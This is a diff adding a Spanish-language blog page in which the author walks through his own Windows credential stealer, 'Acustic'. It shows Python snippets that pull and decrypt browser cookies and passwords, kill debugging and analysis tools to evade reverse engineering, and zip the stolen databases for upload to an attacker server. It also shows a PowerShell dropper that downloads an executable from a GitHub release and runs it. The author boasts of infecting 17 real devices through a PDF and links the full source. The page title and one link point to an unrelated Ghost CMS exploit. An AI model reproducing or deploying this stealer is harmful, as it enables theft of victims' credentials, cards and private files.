@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <title>Explotando GhostCMS</title>
+    <link rel="stylesheet" href="css/stying.css">
+</head>
+<body>
+    <header>
+        <h1>Robando Crendenciales</h1>
+    </header>
+    <div class="container">
+        <div class="blog-content">
+            <p>Voy iniciar explicando puntos importantes, especificamente dos puntos.
+                1 - La versión publicada del Malware es inofensiva con una buena seguridad.
+                2 - Si usted manipula dicho malware está bajo su responsabilidad, yo solo soy un contribuyente a la causa.
+            </p>
+            <p>Un Cookie Stealer es un tipo de malware diseñado para robar credenciales mediante la extracción de cookies. Además de capturar cookies, este tipo de software malicioso puede recopilar diversos datos almacenados en la computadora de la víctima.
+            Muchos de los Stealer en ese momento usaban una subida de archivo curiosa, lo hacian usando <a href="https://core.telegram.org/bots/api" target="_blank">WeebHooks<a href="https://core.telegram.org/bots/api" target="_blank"></a> Telegram.
+            </p>
+            <p>Inspirándome en distintos stealers, comencé a desarrollar mi propio proyecto: Acustic. Buscaba algo sencillo, rápido y fácil de analizar a gran escala, por lo que opté por Python como lenguaje de desarrollo. Acustic está diseñado exclusivamente para Windows, compatible desde la versión 8 hasta la 11.
+                Una vez finalizado el desarrollo, necesitaba un método de propagación y un disparador, es decir, un archivo encargado de ejecutar el stealer. Dado que Acustic estaba enfocado en Windows, la mejor opción era utilizar PowerShell (ps1) como disparador.</p>
+            <div class="code-box">
+                <code>
+                    Extración de imagenes y videos.
+                    Extracción de Cookies.
+                    Extracción de Tarjetas Bancarias.
+                    Extracción de Números y Correos Electronicos.
+                    Geolocalización.   
+                </code>
+            </div>
+            <p>Antes de dar el siguente paso, ya teniendo Acustic desarrollado con las caracteristicas antes mencionadas.
+                Voy a darle un desglose al codigo.
+            </p>
+            <pre class="code-hack"><code class="language-python">
+def __init__(self) -> None:
+    self.SET_LOCAL = (os.getenv("LOCALAPPDATA"),os.getenv("APPDATA"))
+            </code></pre> 
+            <p>__init__ contiene SET_LOCAL, la cuál se encarga de guardar la ruta APPDATA Y LOCALAPPDATA en una tupla.</p>
+            <pre class="code-hack"><code class="language-python">
+def sett_args_browser
+    for e in data_br0wser:
+        for rute in self.SET_LOCAL:
+            File_List.append(e.replace("rute", rute))
+    return _File_List
+            </code></pre>
+            <p>El primer for recorre una tupla la cuál contiene rutas de sistemas dónde debe buscar los registros del navegador.
+            Las rutas inician con una palabra clave "rute", al recorrer SET_LOCAL se abre una lista vacía y se remplaza la palabra clave, con la ruta que extrae os.getenv(),
+            peero, ¿Por qué necesito dos rutas en una tupla? En cada sistema, las rutas pueden variar, por lo que utilizo APPDATA y LOCALAPPDATA. Si una de ellas no existe, la otra seguirá disponible, evitando posibles errores en la ejecución.   
+            </p>
+            <pre class="code-hack"><code class="language-python">
+class Acustic_data:
+def chrome_set_hours
+def dr3cpt_fil3
+def drecypt_using
+            </code></pre>
+            <p>La clase Acustic_data, es la que se encarga de desencriptar las cookies y password guardadas. Y sí... Tan seguras no es la seguridad.
+                no me voy a meter mucho en el tema, considero que es algo muy sencillo, si necesita saber como romper el cifrado, puede leer más <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://translate.google.com/translate%3Fu%3Dhttps://thepythoncode.com/article/extract-chrome-cookies-python%26hl%3Des%26sl%3Den%26tl%3Des%26client%3Dsrp%26prev%3Dsearch" target="_blank">aquí<a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://translate.google.com/translate%3Fu%3Dhttps://thepythoncode.com/article/extract-chrome-cookies-python%26hl%3Des%26sl%3Den%26tl%3Des%26client%3Dsrp%26prev%3Dsearch" target="_blank"></a>.
+                Por otra parte, primeramente las variables, funciones y tipo de codeo fue diferente, para buscar eludir los Av, 
+                también cuenta con una función la cuál se encarga de cortar procesos de reversing, por si llegaran a pillar la movida, no puedan hacerle Reeversing al .exe.
+            </p>
+            <pre class="code-hack"><code class="language-python">
+_P0P3N_ = ('x96dbg', 'vmsrvc', 'x32dbg','fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark')
+@staticmethod
+def pop3n_service():
+    pr0ces_ = psutil.process_iter(attrs=['pid', 'name'])
+    for _p in pr0ces_:
+       if _p.info['name'].split(".")[0].lower() in _P0P3N_:
+          subprocess.run(f"taskkill /F /PID {_p.info['pid']}", shell= True, capture_output= True)
+            </code></pre>
+            <p>La función se encarga de cortar los procesos que se encuentran definidos en _P0P3N_,
+                pr0ces_ obtiene los procesos activos en el sistema victima, los recorremos con un for, se separa usando split(".") Y
+                se obtiene la posición [0] se aplica lower() que indica que "name" se obtendra en texto bajo y se comparara si dicho proceso se encuentra en _P0P3N_,
+                en caso se encuentre crea un subproceso cortando el proceso. 
+            </p> 
+            <p>Bien, retomando lo principal, una vez se extraen las Cookies y contraseñas, se proceden a guardar en una base de datos, obviamente Sqlite.
+                Estas bases de datos contienen las Cookies y contraseñas en texto claro, al igual que los sitios respectivos de donde se hacen uso y su fecha de registro.
+                También se genera un .txt donde contiene las rutas de navegadores que generaron error, aquí viene lo interesante, para subir todo lo recopilado a mi servidor atacante, 
+                primero comprimo la información obtenida, bases de datos, imagenes, videos, etc, etc.
+            </p>
+            <pre class="code-hack"><code class="language-python">
+@staticmethod
+def zip_dat3_dd():
+    compression = zipfile.ZIP_DEFLATED
+    zsp = zipfile.ZipFile(f"{RUTES[0]}\\DateUser\\Data0fSystem.zip", mode="w")
+    zsp.write(f"{RUTES[0]}\\DateUser\\CookedGrabb3r.db", compress_type=compression)
+    zsp.write(f"{RUTES[0]}\\DateUser\\P4ssW0rd.db", compress_type=compression)
+    zsp.write(f"{RUTES[0]}\\DateUser\\error_browser.txt", compress_type=compression)
+    zsp.close()
+            </code></pre>
+            <p>En mi caso, subí el archivo .zip generado a mi servidor utilizando cifrado para proteger los datos en tránsito. Es importante destacar que mi servidor estaba ubicado en un país diferente al de la víctima. La encriptación se empleó específicamente para asegurar la conexión entre el servidor y la máquina objetivo.
+            </p>
+            <p>Las siguentes sentencias SQL son las encargadas de crear las bases de datos donde se guarda la información extraida:</p>
+            <pre class="code-hack"><code class="language-python">
+cursor_f3tch.execute('''CREATE TABLE IF NOT EXISTS logout_cook 
+                            (host varchar(27) NULL,
+                            nombre varchar(30) NULL,
+                            cookie TEXT,
+                            tiempo_creacion TEXT,
+                            acces_tiempo TEXT,
+                            expirate TEXT)''')
+            </code></pre>
+            <p>Contraseñas: </p>
+            <pre class="code-hack"><code class="language-python">
+cursor_f3tch.execute("CREATE TABLE IF NOT EXISTS sys_log 
+                   (uri varchar(70) NULL, 
+                   user varchar(50) NULL, 
+                   password_d varchar(235))")
+            </code></pre>
+            <p>Como antes había dicho, Acustic cuenta con manejo de errores: <p>
+                <pre class="code-hack"><code class="language-python">
+def g3pathErr0r(self, arg):
+    f3le_err0r = open(f"{RUTES[0]}\\DateUser\\error_browser.txt", "a")
+    f3le_err0r.write(arg + os.linesep)
+    f3le_err0r.close()
+                </code></pre>
+            <p>Cualquier Error que se genere al momento que se ejecute, es capturado y guardado. También genera información del sistema infectado:</p>
+            <pre class="code-hack"><code class="language-python">
+    name_c = platform.uname() #metodo para obtener información tipo: versión, nombre, procesador, etc. 
+    bt_pc0 = psutil.sensors_battery()
+    ip_info = Sessi0nD4ta0fPc().g3tD3ta_state_identify() #Consulta la dirección ip y crea una datagrama de ubicaciónes.
+            </code></pre>
+            <p>Eso fue un pequeño repaso sobre el malware, ahora, lo importante, el disparador</p>
+            <pre class="code-hack"><code class="language-powershell">
+function Set_Log_Acustic {
+        if (Test-Path "$env:TEMP\Program-dll\$file" -PathType Leaf){
+                    Execute_Program
+        }else{
+            try{
+                $url_find0 = "https://github.com/Eduardx-2/Acustic-Grabber/releases/download/untagged-baa4b96466e3366b0aee/acustic_extract.exe"
+                $rute_acust9c = "$env:temp\Program-dll"
+                Invoke-WebRequest -Uri $url_find0 -OutFile (Join-Path -Path $rute_acust9c $file)
+                Execute_Program
+            }catch  [ System.UnauthorizedAccessException]{
+                        Write-Host " + CategoryInfo   : NotSpecified: (:) UnauthorizedAdminException
+                        + ErrorAdmin   :  Run the file as administrator,System.UnauthorizedAccessException"
+            }
+                        
+            }
+                </code></pre>
+            <p>La función principal se encarga de descargar el malware y ponerlo en una ruta especifica, para poderlo ejecutar.
+                En este caso %url_find0 apunta a un releases de github, pero anteriormente apuntaba a mí servidor.
+                Al igual que Acustic el disparador cuenta con detener procesos de sistemas:
+            </p>
+            <pre class="code-hack"><code class="language-powershell">
+$proc_env = Get-Process | Select-Object -Property Name, Id
+foreach($procces in $proc_env){
+    if($procces.Name -in $system_adm_env){
+        Stop-Process -Name $procces.Name -Force
+        
+    }
+}
+            </code></pre>
+            <p>Teniendo en cuenta todo esto, ¿cuál será el vector de infección? Pues bien, uno de los métodos más sencillos es mediante un PDF. La gente suele confiar en este tipo de archivos, así que, ¿por qué no usarlos para propagar malware?
+                La idea parecía perfecta, pero comencé a considerar múltiples factores. Ya sabes, esas cosas que se analizan a fondo antes de ejecutar un ataque. Aun así, sigue siendo una opción viable. </p>
+            <p>Y sí, logré infectar 17 dispositivos con un simple PDF JAJAJAJJAJ, ojo, no solo un PDF también con la mano de Dios.
+               Un simple programa que fue desarrollado en dos semanas puede acabarte, recuerda que está información es muy valiosa para un atacante, nunca confies en lo que descargas, la proximá no será un Stealer, podria ser un ransomware.
+            </p>
+            <div class="code-box">
+                <code>
+                    Puede visualizar el codigo <a href="https://github.com/Eduardx-2/Acustic-Grabber" target="_blank">aquí<a href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git" target="_blank"></a>  
+                </code>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+            <a class="back-link" href="../index.html">⬅ Volver al Blog</a>
+        </div>
+    </div>
+</body>
+</html>
